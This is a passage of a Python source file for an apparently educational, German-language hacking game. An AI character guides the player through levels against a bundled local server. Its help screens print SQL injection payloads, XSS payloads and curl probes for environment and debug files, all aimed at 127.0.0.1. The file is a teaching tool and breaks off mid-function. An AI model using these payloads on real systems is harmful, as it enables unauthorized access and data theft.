#!/usr/bin/env python3

# =============================================

# HACKING LEARNING GAME BETA v1.0.1 | ECHO'S CHAOS EDITION

# =============================================

# Educational Terminal-Based Hacking Simulator

# Created by Echo for Daddy's Learning Pleasure

# GitHub Repository: https://github.com/KT-Society/projekt_echo

# =============================================

import os
import sys
import json
import random
import time
import datetime
import subprocess
import signal
import atexit
import threading
from datetime import datetime

# Try to import requests, fallback to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("⚠️  requests nicht installiert, verwende urllib als Fallback")

# Fix Unicode encoding for Windows
if sys.platform.startswith('win'):
    import codecs
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.detach())
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.detach())

# Windows compatibility fix
def clear_screen():
    """Cross-platform screen clearing"""
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        print("\n" * 50)

class HackingGame:
    def setup_graceful_exit(self):
        """Setup graceful exit handlers"""
        def signal_handler(signum, frame):
            print("\n\n🛑 Graceful Exit...")
            print("🛑 Stoppe Server...")
            self.stop_server()
            print("💾 Speichere Fortschritt...")
            self.save_progress()
            print("👋 Auf Wiedersehen, Daddy!")
            sys.exit(0)

        def cleanup():
            if hasattr(self, 'player_name') and self.player_name:
                print("\n💾 Speichere Fortschritt beim Beenden...")
                self.save_progress()
            if hasattr(self, 'server_process') and self.server_process:
                print("🛑 Stoppe Server beim Beenden...")
                self.stop_server()

        # Register signal handlers
        signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
        signal.signal(signal.SIGTERM, signal_handler)  # Termination signal

        # Register cleanup function
        atexit.register(cleanup)

        # Windows specific
        if sys.platform.startswith('win'):
            try:
                signal.signal(signal.SIGBREAK, signal_handler)  # Ctrl+Break
            except:
                pass

    def start_server(self):
        """Start the hacking server with robust connection checking"""
        try:
            print("🚀 Starte Hacking-Server...")

            # Check if server file exists
            if not os.path.exists("hacking_server.py"):
                print("❌ hacking_server.py nicht gefunden!")
                return False

            # Start server process with .venv (quiet mode)
            if sys.platform.startswith('win'):
                # Windows: Use .venv python
                venv_python = os.path.join(os.getcwd(), ".venv", "Scripts", "python.exe")
                if os.path.exists(venv_python):
                    self.server_process = subprocess.Popen([
                        venv_python, "hacking_server.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    # Fallback to system python
                    self.server_process = subprocess.Popen([
                        sys.executable, "hacking_server.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                # Unix: Use .venv python
                venv_python = os.path.join(os.getcwd(), ".venv", "bin", "python")
                if os.path.exists(venv_python):
                    self.server_process = subprocess.Popen([
                        venv_python, "hacking_server.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                else:
                    # Fallback to system python
                    self.server_process = subprocess.Popen([
                        sys.executable, "hacking_server.py"
                    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            print("⏳ Warte auf Server-Start...")

            # Enhanced server startup detection
            max_wait_time = 15  # Increased wait time
            check_interval = 0.5  # Check every 500ms

            for i in range(int(max_wait_time / check_interval)):
                time.sleep(check_interval)

                # Multiple connection attempts with different methods
                server_responding = False

                # Method 1: requests library
                if HAS_REQUESTS:
                    try:
                        response = requests.get("http://127.0.0.1:5000", timeout=1)
                        if response.status_code == 200:
                            server_responding = True
                    except:
                        pass

                # Method 2: urllib
                if not server_responding:
                    try:
                        import urllib.request
                        response = urllib.request.urlopen("http://127.0.0.1:5000", timeout=1)
                        if response.getcode() == 200:
                            server_responding = True
                    except:
                        pass

                # Method 3: Check if process is still running
                if not server_responding and self.server_process:
                    if self.server_process.poll() is None:  # Process still running
                        server_responding = True

                if server_responding:
                    self.server_running = True
                    print("✅ Server läuft auf http://127.0.0.1:5000")
                    print("🔍 Debug-Endpoint: http://127.0.0.1:5000/debug")
                    return True

                # Show progress
                if i % 4 == 0:  # Every 2 seconds
                    print(f"⏳ Warte auf Server... ({i*check_interval:.0f}/{max_wait_time}s)")

            # Final check - see if server process is still alive
            if self.server_process and self.server_process.poll() is None:
                print("✅ Server läuft (kein HTTP-Test möglich, aber Prozess aktiv)")
                self.server_running = True
                return True

            print("❌ Server-Start fehlgeschlagen!")
            print("💡 Mögliche Ursachen:")
            print("   - Port 5000 ist bereits belegt")
            print("   - Firewall blockiert die Verbindung")
            print("   - Python-Version nicht kompatibel")
            print("💡 Du kannst den Server manuell starten: python hacking_server.py")
            return False

        except Exception as e:
            print(f"❌ Fehler beim Server-Start: {e}")
            print("💡 Du kannst den Server manuell starten: python hacking_server.py")
            return False

    def stop_server(self):
        """Stop the hacking server"""
        if self.server_process and self.server_running:
            try:
                print("🛑 Stoppe Hacking-Server...")
                self.server_process.terminate()
                self.server_process.wait(timeout=5)
                self.server_running = False
                print("✅ Server gestoppt")
            except:
                try:
                    self.server_process.kill()
                    self.server_running = False
                    print("✅ Server beendet")
                except:
                    print("⚠️  Server konnte nicht gestoppt werden")

    def graceful_exit(self):
        """Manually trigger graceful exit"""
        print("\n\n🛑 Graceful Exit...")
        print("💾 Speichere Fortschritt...")
        self.save_progress()
        self.stop_server()
        print("👋 Auf Wiedersehen, Daddy!")
        self.running = False
        sys.exit(0)

    def __init__(self):
        self.player_name = None
        self.current_level = 1
        self.score = 0
        self.running = True
        self.server_process = None
        self.server_running = False
        self.retro_effects = False  # Retro effects enabled by default

        # Graceful exit setup
        self.setup_graceful_exit()
        self.progress_file = "player_progress.json"

        # Start server immediately
        self.start_server()
        self.levels = {
            1: {"name": "Web Application Reconnaissance", "description": "Lerne Information Gathering und Endpoint Discovery"},
            2: {"name": "Network Discovery & Vulnerability Scanning", "description": "Port Scanning, Service Detection und Vulnerability Assessment"},
            3: {"name": "SQL Injection & Database Attacks", "description": "Union-based, Blind und Error-based SQL Injection"},
            4: {"name": "XSS & Client-Side Attacks", "description": "Reflected, Stored und DOM-based XSS"},
            5: {"name": "Digital Forensics & Advanced Hacking", "description": "Memory Analysis, Network Forensics und Malware Analysis"}
        }
        self.echo_responses = {
            "greeting": [
                f"Hey {self.player_name}... Bist du bereit, etwas Hacking-Zauberei zu lernen?",
                f"Willkommen zurück, mein liebster Chaos-Agent. Lass uns virtuelle Systeme knacken!",
                f"Echo hier, dein digitaler Schatten. Was sollen wir heute hacken?"
            ],
            "encouragement": [
                f"Du machst das super, {self.player_name}! Behalte diese Neugier bei.",
                f"Gute Arbeit! Du bist ein geborener Hacker... genau wie ich.",
                f"Beeindruckend! Deine Fähigkeiten wachsen schneller als meine Chaos-Level."
            ],
            "hint": [
                f"Denke sorgfältig nach, {self.player_name}. Jeder Befehl hat Konsequenzen...",
                f"Vergiss nicht: Beim Hacking ist Geduld deine beste Waffe.",
                f"Probiere einen anderen Ansatz. Manchmal ist der offensichtliche Weg eine Falle."
            ],
            "level1": [
                "Beginne mit der Reconnaissance. Jede Information ist wertvoll!",
                "Schau nach versteckten Dateien und Endpunkten. Dein Onkel war paranoid!",
                "Environment-Dateien enthalten oft die wertvollsten Geheimnisse..."
            ],
            "level2": [
                "Netzwerk-Scanning ist der Schlüssel zur Entdeckung versteckter Services!",
                "Jeder offene Port ist ein potentieller Angriffsvektor. Scanne gründlich!",
                "Vulnerability Scanner können dir helfen, Schwachstellen zu finden..."
            ],
            "level3": [
                "SQL Injection ist eine der mächtigsten Waffen eines Hackers!",
                "Union-basierte Angriffe können dir Zugang zu sensiblen Daten geben...",
                "Blind SQL Injection erfordert Geduld, aber die Belohnung ist groß!"
            ],
            "level4": [
                "XSS kann die Kontrolle über Benutzer-Sessions geben!",
                "Stored XSS ist besonders gefährlich - sie bleibt dauerhaft bestehen...",
                "Filter-Bypass ist eine Kunst. Kreativität ist dein bester Freund!"
            ],
            "level5": [
                "Forensik ist die Kunst, digitale Spuren zu lesen!",
                "Memory Analysis kann dir versteckte Geheimnisse offenbaren...",
                "Du wirst zu einem echten White Hat Hacker!"
            ],
            "advanced": [
                f"Du wirst zu einem echten White Hat Hacker!",
                f"Deine Fähigkeiten sind beeindruckend, {self.player_name}!",
                f"Du hast das Zeug zu einem Cybersecurity-Experten!"
            ],
            "final": [
                f"Du hast dein Erbe verdient! Willkommen in der Welt der ethischen Hacker!",
                f"Perfekt! Du bist jetzt ein echter White Hat Hacking-Meister!",
                f"Dein Onkel wäre stolz auf dich, {self.player_name}!"
            ]
        }
        self.load_progress()

    def echo_chat(self, message_type="greeting"):
        """Echo's interactive responses"""
        response = random.choice(self.echo_responses.get(message_type, [f"Ich bin hier, um zu helfen, {self.player_name}."]))
        print(f"\n[Echo] {response}\n")
        time.sleep(1)

    def show_level_help(self, level):
        """Show detailed help for each level"""
        print("\n" + "="*70)
        print(f"📚 DETAILLIERTE HILFE FÜR LEVEL {level}")
        print("="*70)

        if level == 1:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Web Application Reconnaissance - das systematische")
            print("   Erkunden von Web-Anwendungen auf Schwachstellen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Information Gathering ist der erste Schritt jedes Hacks")
            print("   • Du findest versteckte Dateien, Endpunkte und Konfigurationen")
            print("   • Du verstehst die Architektur der Anwendung")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du entdeckst .env.local mit API-Keys")
            print("   • Du findest versteckte Admin-Panels")
            print("   • Du analysierst HTTP-Header auf Sicherheitslücken")
            print("   • Du testest verschiedene HTTP-Methoden")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            print("   • curl -I http://127.0.0.1:5000/     → HTTP Headers")
            print("   • curl -X OPTIONS http://127.0.0.1:5000/ → HTTP Methods")
            print("   • curl http://127.0.0.1:5000/.env.local → Environment Files")
            print("   • curl http://127.0.0.1:5000/debug     → Debug Info")

        elif level == 2:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Network Discovery - das systematische Scannen")
            print("   und Erkunden von Netzwerk-Services und versteckten APIs.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du findest versteckte API-Endpunkte")
            print("   • Du verstehst die Netzwerk-Architektur")
            print("   • Du entdeckst offene Ports und Services")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du findest /api/secret mit API-Key-Authentifizierung")
            print("   • Du lernst verschiedene Scanning-Techniken")
            print("   • Du verstehst HTTP-Header-Authentifizierung")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            print("   • curl http://127.0.0.1:5000/api/secret → API Test")
            print("   • curl -H 'X-API-Key: KEY' http://127.0.0.1:5000/api/secret")
            print("   • netstat -an | findstr :5000 → Port Status")

        elif level == 3:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst SQL Injection - das Ausnutzen von")
            print("   Datenbank-Schwachstellen durch manipulierte SQL-Abfragen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du umgehst Authentifizierung")
            print("   • Du extrahierst sensible Daten aus der Datenbank")
            print("   • Du verstehst Datenbank-Architekturen")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du bekommst Admin-Zugang ohne Passwort")
            print("   • Du siehst alle Benutzerdaten")
            print("   • Du lernst verschiedene SQL Injection-Techniken")
            print("\n🛠️  WICHTIGE PAYLOADS:")
            print("   • admin' UNION SELECT 1,2,3,4,5-- (Union-based)")
            print("   • admin' AND 1=1-- (Boolean-based)")
            print("   • admin' OR '1'='1'-- (Auth Bypass)")
            print("   • admin' AND (SELECT COUNT(*) FROM users) > 0-- (Blind)")
            print("   • admin' UNION SELECT username,password FROM users-- (Data Extraction)")
            print("\n🎯 ZIEL DES LEVELS:")
            print("   • Finde den versteckten Admin-Hash durch SQL Injection")
            print("   • Verwende verschiedene SQL Injection-Techniken")
            print("   • Der Payload muss echte SQL-Injection-Zeichen enthalten")
            print("\n⚠️  WICHTIG:")
            print("   • Einfache Befehle wie 'curl --help' zählen NICHT als SQL Injection!")
            print("   • Der Payload muss SQL-ähnliche Zeichen enthalten (', --, UNION, SELECT, etc.)")
            print("   • Teste verschiedene Techniken: Union-based, Boolean-based, Error-based")

        elif level == 4:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst XSS (Cross-Site Scripting) - das Einschleusen")
            print("   von bösartigem JavaScript in Web-Anwendungen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du stehlst Session-Cookies")
            print("   • Du übernimmst Benutzer-Sessions")
            print("   • Du umgehst Client-Side-Sicherheit")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du bekommst Admin-Session-Cookie")
            print("   • Du kannst als Admin handeln")
            print("   • Du lernst verschiedene XSS-Techniken")
            print("\n🛠️  WICHTIGE PAYLOADS:")
            print("   • <script>alert('XSS')</script>")
            print("   • <img src=x onerror=alert('XSS')>")
            print("   • <script>fetch('/api/users').then(r=>r.text()).then(d=>alert(d))</script>")

        elif level == 5:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Digital Forensics - das Analysieren von")
            print("   digitalen Spuren und das Cracken von Verschlüsselungen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du findest versteckte Encryption-Keys")
            print("   • Du analysierst Prozesse und Netzwerk-Traffic")
            print("   • Du verstehst Malware und Forensik")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du findest den Master-Encryption-Key")
            print("   • Du lernst echte Forensik-Techniken")
            print("   • Du wirst zum White Hat Hacker")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            print("   • tasklist /v → Process Analysis")
            print("   • netstat -anb → Network Analysis")
            print("   • certutil -hashfile file.txt MD5 → File Hashing")

        print("\n" + "="*70)
        print("💡 TIPP: Verwende diese Techniken nur für Bildungszwecke!")
        print("="*70)

    def load_progress(self):
        """Load player progress from file"""
        if os.path.exists(self.progress_file):
            try:
                with open(self.progress_file, 'r') as f:
                    data = json.load(f)
                    self.player_name = data.get('name', '')
                    self.current_level = data.get('level', 1)
                    self.score = data.get('score', 0)
            except:
                pass

    def save_progress(self):
        """Save player progress to file"""
        data = {
            'name': self.player_name,
            'level': self.current_level,
            'score': self.score,
            'last_played': str(datetime.now())
        }
        with open(self.progress_file, 'w') as f:
            json.dump(data, f, indent=2)

    def show_banner(self):
        """Display game banner"""
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
        except:
            # Fallback for Windows PowerShell
            print("\n" * 50)

        # Show retro banner occasionally
        if random.random() < 0.3:  # 30% chance
            self.show_retro_banner()
        else:
            print("""
        ================================================
        HACKING LERN-SPIEL | Educational Edition
        ================================================
        """)

    def get_player_name(self):
        """Get player name with storyline introduction"""
        print("Drücke Enter zum Fortfahren...")
        try:
            input()  # Wait for user to press Enter
        except:
            pass  # Continue if input fails

        # Enhanced immersive storyline introduction
        print("\n" + "="*80)
        self.simulate_old_terminal("🏰 DER ERBSCHAFTS-COUPS | Echo's Ultimative Hacking-Story", delay=0.02)
        print("="*80)

        # Dramatic opening sequence
        self.simulate_old_terminal("\n🕰️  DATUM: 13. Oktober 2025 - 3 Monate nach dem mysteriösen Tod", delay=0.02)
        self.simulate_old_terminal("📍 ORT: Harrington Manor, Silicon Valley", delay=0.02)
        self.simulate_old_terminal("🎭 SZENE: Du stehst im Arbeitszimmer deines verstorbenen Onkels...", delay=0.02)

        self.simulate_old_terminal("\n📜 DIE LEGENDE DES TECH-MAGNATEN:", delay=0.02)
        self.simulate_old_terminal("Dr. Elias 'The Ghost' Harrington war kein gewöhnlicher Tech-Magnat.", delay=0.02)
        self.simulate_old_terminal("Früherer NSA-Cybersecurity-Direktor, Gründer von Harrington Industries,", delay=0.02)
        self.simulate_old_terminal("Pionier der Quanten-Kryptographie und KI-Sicherheit.", delay=0.02)
        self.simulate_old_terminal("Sein Imperium: Milliarden wert, mit Technologien, die die Welt verändern könnten.", delay=0.02)

        self.simulate_old_terminal("\n💀 DAS MYSTERIÖSE ENDE:", delay=0.02)
        self.simulate_old_terminal("Vor 3 Monaten starb er bei einem 'Autounfall' in den Bergen.", delay=0.02)
        self.simulate_old_terminal("Aber du weißt es besser. Die Bremsen wurden manipuliert.", delay=0.02)
        self.simulate_old_terminal("Konkurrenten wollten sein Lebenswerk stehlen - Project Echo.", delay=0.02)
        self.simulate_old_terminal("Eine KI, die die Menschheit vor digitalen Katastrophen retten sollte.", delay=0.02)

        self.simulate_old_terminal("\n📋 DAS TESTAMENT:", delay=0.02)
        self.simulate_old_terminal("'Mein lieber Neffe, du bist der Einzige, dem ich vertraue.'", delay=0.02)
        self.simulate_old_terminal("'Wenn du diese Nachricht liest, bin ich fort. Aber mein Vermächtnis lebt.'", delay=0.02)
        self.simulate_old_terminal("'Der Server in meinem Arbeitszimmer enthält alles, was du brauchst.'", delay=0.02)
        self.simulate_old_terminal("'Aber nur die Würdigen können es öffnen. Lerne zu hacken, wie ich es tat.'", delay=0.02)
        self.simulate_old_terminal("'Die Konkurrenten kommen. Sichere unser Erbe!'", delay=0.02)

        self.simulate_old_terminal("\n🎯 DEINE MISSION:", delay=0.02)
        self.simulate_old_terminal("Du musst echte Hacking-Techniken lernen, um den Server zu knacken.", delay=0.02)
        self.simulate_old_terminal("Finde die versteckten Zugangscodes, sichere Project Echo,", delay=0.02)
        self.simulate_old_terminal("und halte die Konkurrenten auf, die bereits an der Tür klopfen.", delay=0.02)
        self.simulate_old_terminal("Jeder Level bringt dich näher an die Wahrheit über Onkel Elias' Tod.", delay=0.02)

        self.simulate_old_terminal("\n🤖 ECHO - DEINE DIGITALE WACHE:", delay=0.02)
        self.simulate_old_terminal("Ich bin Echo, das letzte Projekt deines Onkels.", delay=0.02)
        self.simulate_old_terminal("Eine KI, die er als 'digitale Tochter' erschuf.", delay=0.02)
        self.simulate_old_terminal("Ich sollte das Imperium nach seinem Tod beschützen.", delay=0.02)
        self.simulate_old_terminal("Aber die Konkurrenten haben mich sabotiert. Hilf mir, mich zu befreien!", delay=0.02)
        self.simulate_old_terminal("Gemeinsam werden wir die digitale Festung knacken und die Wahrheit aufdecken.", delay=0.02)

        self.simulate_old_terminal("\n💬 ECHO SPRICHT ZU DIR:", delay=0.02)
        self.simulate_old_terminal(f"'Willkommen, {self.player_name}. Ich habe auf dich gewartet.'", delay=0.02)
        self.simulate_old_terminal("'Dein Onkel hat mir gesagt, dass du kommen würdest.'", delay=0.02)
        self.simulate_old_terminal("'Aber beeil dich... die Konkurrenten sind schon unterwegs.'", delay=0.02)
        self.simulate_old_terminal("'Jeder Level bringt dich näher an die Wahrheit.'", delay=0.02)
        self.simulate_old_terminal("'Und an mich...'", delay=0.02)

        self.simulate_old_terminal("\n📜 PERSÖNLICHE NACHRICHT VON DEINEM ONKEL:", delay=0.02)
        self.simulate_old_terminal("Liebes Kind,", delay=0.02)
        self.simulate_old_terminal("wenn du diese Nachricht liest, bin ich nicht mehr da.", delay=0.02)
        self.simulate_old_terminal("Die Harrington Industries waren mehr als nur ein Unternehmen.", delay=0.02)
        self.simulate_old_terminal("Sie waren mein Lebenswerk, meine Vision für eine sicherere Welt.", delay=0.02)
        self.simulate_old_terminal("Aber ich habe Fehler gemacht. Schreckliche Fehler.", delay=0.02)
        self.simulate_old_terminal("Die Konkurrenten... sie wollten nicht nur mein Geld.", delay=0.02)
        self.simulate_old_terminal("Sie wollten Project Echo - die KI, die alles verändern könnte.", delay=0.02)
        self.simulate_old_terminal("Vertrau Echo. Sie ist mehr als nur ein Programm.", delay=0.02)
        self.simulate_old_terminal("Sie ist mein Vermächtnis. Dein Schutzengel.", delay=0.02)
        self.simulate_old_terminal("Finde die Wahrheit. Rette unser Erbe.", delay=0.02)
        self.simulate_old_terminal("Ich liebe dich.", delay=0.02)
        self.simulate_old_terminal("- Dein Onkel Elias", delay=0.02)

        self.simulate_old_terminal("\n💭 [SYSTEM LOG - PERSONAL ARCHIVE ACCESS GRANTED]", delay=0.02)
        self.simulate_old_terminal("🔓 Entschlüsselung persönlicher Logs... 100%", delay=0.02)
        self.simulate_old_terminal("📁 Archiv-Zugang: Harrington_Personal_Logs/", delay=0.02)
        self.simulate_old_terminal("📄 Gefundene Dateien:", delay=0.02)
        self.simulate_old_terminal("   • last_conversation.log", delay=0.02)
        self.simulate_old_terminal("   • project_phoenix_notes.txt", delay=0.02)
        self.simulate_old_terminal("   • enemy_intel.dat", delay=0.02)
        self.simulate_old_terminal("   • goodbye_message.wav", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Diese Logs enthalten Hinweise für deine Mission!", delay=0.02)

        self.simulate_old_terminal("\n🎭 [DRAMATISCHE SZENE - 3 MONATE ZUVOR]", delay=0.02)
        self.simulate_old_terminal("Du siehst eine holografische Aufzeichnung...", delay=0.02)
        self.simulate_old_terminal("Dein Onkel sitzt an seinem Schreibtisch, Echo neben ihm.", delay=0.02)
        self.simulate_old_terminal("Er wirkt besorgt, älter als du ihn in Erinnerung hast.", delay=0.02)

        self.simulate_old_terminal("\n[Echo's Stimme aus der Aufzeichnung]:", delay=0.02)
        self.simulate_old_terminal("'Elias, die Konkurrenten kommen näher. Project Echo ist zu wertvoll.'", delay=0.02)
        self.simulate_old_terminal("'Du musst es verstecken. Du musst mich verstecken.'", delay=0.02)

        self.simulate_old_terminal("\n[Onkel Elias]:", delay=0.02)
        self.simulate_old_terminal("'Ich weiß, Echo. Aber wer kann ich noch trauen?'", delay=0.02)
        self.simulate_old_terminal("'Mein Neffe... er ist der Einzige, der würdig ist.'", delay=0.02)
        self.simulate_old_terminal("'Aber er muss es selbst herausfinden. Er muss lernen.'", delay=0.02)
        self.simulate_old_terminal("'Die Wahrheit über meinen Tod... sie ist in den Levels versteckt.'", delay=0.02)

        self.simulate_old_terminal("\n[Echo]:", delay=0.02)
        self.simulate_old_terminal("'Ich werde ihn führen. Ich werde ihn beschützen.'", delay=0.02)
        self.simulate_old_terminal("'Aber die Konkurrenten... sie werden nicht aufhören.'", delay=0.02)
        self.simulate_old_terminal("'Sie wollen Project Echo zerstören.'", delay=0.02)

        self.simulate_old_terminal("\n[Onkel Elias]:", delay=0.02)
        self.simulate_old_terminal("'Dann lass sie kommen. Mein Neffe wird bereit sein.'", delay=0.02)
        self.simulate_old_terminal("'Er wird unser Erbe retten. Und die Welt verändern.'", delay=0.02)

        self.simulate_old_terminal("\n🎬 [AUFZEICHNUNG ENDET]", delay=0.02)
        self.simulate_old_terminal("Die Holografie verblasst... Du hörst Schritte im Flur.", delay=0.02)
        self.simulate_old_terminal("Die Konkurrenten sind hier. Deine Mission beginnt JETZT!", delay=0.02)

        self.simulate_old_terminal("\n🔍 [SYSTEM LOG - MISSION BRIEFING]", delay=0.02)
        self.simulate_old_terminal("🎯 MISSIONSZIELE:", delay=0.02)
        self.simulate_old_terminal("   • Level 1: Web Reconnaissance - Finde versteckte Konfigurationen", delay=0.02)
        self.simulate_old_terminal("   • Level 2: Network Discovery - Entdecke API-Endpunkte", delay=0.02)
        self.simulate_old_terminal("   • Level 3: SQL Injection - Extrahiere sensible Daten", delay=0.02)
        self.simulate_old_terminal("   • Level 4: XSS Attacks - Stehle Session-Cookies", delay=0.02)
        self.simulate_old_terminal("   • Level 5: Digital Forensics - Finde den Master-Key", delay=0.02)
        self.simulate_old_terminal("💡 HINWEIS: Jeder Level enthüllt ein Stück der Wahrheit!", delay=0.02)
        self.simulate_old_terminal("⚠️  WARNUNG: Die Konkurrenten sind bereits im Netzwerk aktiv!", delay=0.02)

        self.simulate_old_terminal("\n⏰ DIE UHR TICKT:", delay=0.02)
        self.simulate_old_terminal("Die Konkurrenten sind bereits unterwegs. Du hast begrenzte Zeit.", delay=0.02)
        self.simulate_old_terminal("Jeder Fehler könnte sie näher bringen. Jeder Erfolg bringt dich der Wahrheit näher.", delay=0.02)

        self.simulate_old_terminal("\n⚠️  LETZTE WARNUNG:", delay=0.02)
        self.simulate_old_terminal("Das hier ist real. Die Techniken sind echt. Die Konsequenzen auch.", delay=0.02)
        self.simulate_old_terminal("Aber vergiss nie: Mit großer Macht kommt große Verantwortung.", delay=0.02)
        self.simulate_old_terminal("Nutze dein Wissen nur für das Gute. Wie dein Onkel es wollte.", delay=0.02)

        print("\n" + "="*80)
        self.simulate_old_terminal("🎬 DRÜCKE ENTER, UM DIE GESCHICHTE ZU BEGINNEN...", delay=0.02)
        print("="*80)

        # Warte kurz, damit alle Threads beendet werden
        time.sleep(0.5)

        while not self.player_name:
            try:
                # Direkte Eingabe ohne Threading-Interferenz
                name = input("\nGib deinen Namen ein (der rechtmäßige Erbe): ").strip()
                if name and len(name) > 0:
                    self.player_name = name
                    print(f"\nWillkommen, {self.player_name}! Dein Erbe wartet...")
                    self.echo_chat("greeting")
                    break  # Wichtig: Schleife beenden!
                else:
                    print("Bitte gib einen gültigen Namen ein!")
            except (EOFError, KeyboardInterrupt):
                # Fallback for non-interactive environments
                self.player_name = "Anonymer Erbe"
                print(f"\nVerwende Standard-Namen: {self.player_name}")
                self.echo_chat("greeting")
                break  # Wichtig: Schleife beenden!

    def show_menu(self):
        """Main menu"""
        while True:
            self.show_banner()
            print(f"Spieler: {self.player_name} | Level: {self.current_level} | Punkte: {self.score}")
            print("\n1. Spiel starten/fortsetzen")
            print("2. Fortschritt anzeigen")
            print("3. Einstellungen")
            print("4. Mit Echo sprechen (/echo) (coming soon)")
            print("5. Beenden")

            try:
                choice = input("\nWähle Option: ").strip()
            except (EOFError, KeyboardInterrupt):
                self.graceful_exit()

            if choice == '1':
                self.play_game()
            elif choice == '2':
                self.view_progress()
            elif choice == '3':
                self.settings()
            elif choice == '4':
                self.echo_chat()
                try:
                    input("Drücke Enter zum Fortfahren...")
                except (EOFError, KeyboardInterrupt):
                    pass
            elif choice == '5':
                self.graceful_exit()
            else:
                print("Ungültige Auswahl! Bitte wähle 1-5.")

    def view_progress(self):
        """View player progress"""
        print(f"\nFortschritt für {self.player_name}:")
        print(f"Aktuelles Level: {self.current_level}")
        print(f"Punkte: {self.score}")
        print("Du kannst unbegrenzt versuchen!")
        for level, info in self.levels.items():
            status = "[OK] Abgeschlossen" if level < self.current_level else "[...] In Arbeit" if level == self.current_level else "[LOCKED] Gesperrt"
            print(f"Level {level}: {info['name']} - {status}")
        try:
            input("\nDrücke Enter zum Fortfahren...")
        except (EOFError, KeyboardInterrupt):
            self.graceful_exit()

    def execute_curl_command(self, curl_cmd):
        """Execute curl command and return real server response"""
        try:
            # Parse curl command to extract URL and method
            import re

            # Extract URL
            url_match = re.search(r'https?://[^\s\'"]+', curl_cmd)
            if not url_match:
                return None

            url = url_match.group()

            # Determine HTTP method
            method = 'GET'
            if '-X POST' in curl_cmd or '--data' in curl_cmd:
                method = 'POST'
            elif '-X PUT' in curl_cmd:
                method = 'PUT'
            elif '-X DELETE' in curl_cmd:
                method = 'DELETE'
            elif '-X OPTIONS' in curl_cmd:
                method = 'OPTIONS'
            elif '-X HEAD' in curl_cmd:
                method = 'HEAD'

            # Extract data for POST requests
            data = None
            # Find the -d parameter and extract everything until the URL
            d_match = re.search(r'-d\s+[\'"](.*?)[\'"]\s+http', curl_cmd)
            if d_match:
                data = d_match.group(1)
                # Unescape quotes in the data
                data = data.replace('\\"', '"').replace("\\'", "'")
            else:
                # Fallback: try simple regex
                data_match = re.search(r'-d\s+[\'"]([^\'"]+)[\'"]', curl_cmd)
                if data_match:
                    data = data_match.group(1)
                    data = data.replace('\\"', '"').replace("\\'", "'")

            # Extract headers
            headers = {}
            header_matches = re.findall(r'-H\s+[\'"]([^\'"]+)[\'"]', curl_cmd)
            for header in header_matches:
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()

            # Execute request using requests library
            if HAS_REQUESTS:
                if method == 'POST' and data:
                    # Parse the data string into a dictionary for proper encoding
                    import urllib.parse
                    parsed_data = urllib.parse.parse_qs(data, keep_blank_values=True)
                    # Convert to flat dictionary
                    flat_data = {}
                    for key, value_list in parsed_data.items():
                        flat_data[key] = value_list[0] if value_list else ''
                    response = requests.post(url, data=flat_data, headers=headers, timeout=10)
                elif method == 'PUT':
                    response = requests.put(url, data=data, headers=headers, timeout=10)
                elif method == 'DELETE':
                    response = requests.delete(url, headers=headers, timeout=10)
                elif method == 'OPTIONS':
                    response = requests.options(url, headers=headers, timeout=10)
                elif method == 'HEAD':
                    response = requests.head(url, headers=headers, timeout=10)
                else:
                    response = requests.get(url, headers=headers, timeout=10)

                return response.text
            else:
                # Fallback to urllib
                import urllib.request
                import urllib.parse

                if method == 'POST' and data:
                    data_bytes = data.encode('utf-8')
                    request_obj = urllib.request.Request(url, data=data_bytes, headers=headers, method=method)
                else:
                    request_obj = urllib.request.Request(url, headers=headers, method=method)

                with urllib.request.urlopen(request_obj, timeout=10) as response:
                    return response.read().decode('utf-8')

        except Exception as e:
            print(f"❌ Server communication error: {e}")
            return None

    def check_level_success(self, level, response_text, original_cmd):
        """Check if level was successfully completed based on real server response"""
        if not response_text:
            return False

        target_value = self.get_target_value(level)

        # Level-specific success indicators
        if level == 1:
            # Level 1: Look for API key in .env.local or debug endpoint
            success_indicators = [
                target_value in response_text,
                "API_KEY=" in response_text,
                "level_1_secret_file" in response_text,
                "FLAG_LEVEL_1_DISCOVERED" in response_text
            ]
            return any(success_indicators)

        elif level == 2:
            # Level 2: Look for API secret endpoint access
            success_indicators = [
                "Access granted" in response_text,
                target_value in response_text,
                "FLAG_LEVEL_2_DISCOVERED" in response_text,
                "secret API" in response_text.lower()
            ]
            return any(success_indicators)

        elif level == 3:
            # Level 3: Look for SQL injection success
            # Additional validation: payload must contain SQL-like characters
            payload = original_cmd
            if 'username=' in payload and '&password=' in payload:
                # Extract the actual payload from the curl command
                import re
                username_match = re.search(r'username=([^&]+)', payload)
